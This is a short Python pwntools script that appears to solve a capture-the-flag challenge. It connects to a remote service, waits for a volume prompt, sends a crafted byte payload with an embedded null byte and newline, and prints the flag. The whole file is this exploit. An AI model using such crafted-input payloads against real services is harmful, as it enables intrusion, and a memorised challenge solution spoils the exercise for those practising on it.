# coding=utf-8
from pwn import *

host = "62.173.140.174"
port = 17400
r = remote(host, port)
payload = b'\x31\x30\x30\x00\x64\x0a\x35\x31'
a = True

while a:
    answer = r.recv().decode('utf-8')
    print(answer)
    if "CODEBY" in answer:
        print(answer)
        a = False
    if 'Enter the desired volume value' in answer:
        r.sendline(payload)
